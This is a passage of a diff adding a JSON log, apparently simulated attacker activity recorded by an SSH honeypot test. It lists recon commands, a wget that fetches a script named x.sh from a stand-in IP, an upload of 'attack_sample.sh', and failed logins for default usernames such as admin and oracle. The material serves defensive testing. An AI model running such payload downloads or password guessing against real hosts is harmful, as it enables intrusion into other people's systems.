+      "output_preview": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\r\nroot         4  2.0  0.3  43490 12091 ?        Ss   Oct09  00:00:05 [rcu_par_gp]\r\nsyslog     900  1.9  0.7 100089 28213 ?     "
+    },
+    {
+      "action": "cmd",
+      "command": "ip addr",
+      "status": "ok",
+      "output_preview": "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\r\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\r\n    inet 127.0.0.1/8 scope host lo\r\n       valid"
+    },
+    {
+      "action": "cmd",
+      "command": "crontab -l",
+      "status": "ok",
+      "output_preview": "crontab: command not found\r\n"
+    },
+    {
+      "action": "cmd",
+      "command": "wget http://203.0.113.9/x.sh",
+      "status": "ok",
+      "output_preview": "--2026-11-07 23:00:08--  http://203.0.113.9/x.sh\r\nResolving 203.0.113.9... failed: Temporary failure in name resolution.\r\nwget: unable to resolve host address '203.0.113.9'\r\n"
+    },
+    {
+      "action": "cmd",
+      "command": "demo_unknown_cmd",
+      "status": "ok",
+      "output_preview": "demo_unknown_cmd: command not found\r\n"
+    },
+    {
+      "action": "scp_upload",
+      "file": "attack_sample.sh",
+      "status": "sent",
+      "size": 36,
+      "ack": "00"
+    },
+    {
+      "action": "login_failed_case",
+      "user": "admin",
+      "status": "auth_failed",
+      "error": "AuthenticationException"
+    },
+    {
+      "action": "login_failed_case",
+      "user": "oracle",
+      "status": "auth_failed",
+      "error": "AuthenticationException"
+    },
+    {
+      "action": "login_failed_case",
+      "user": "test",
+      "status": "auth_failed",
+      "error": "AuthenticationException"
+    },
+    {
+      "action": "login_failed_case",
+      "user": "guest",
+      "status": "auth_failed",
+      "error": "AuthenticationException"
+    },
+    {
+      "action": "login_failed_case",
+      "user": "ftpuser",
+      "status": "auth_failed",
+      "error": "AuthenticationException"
+    }
+  ]
+}
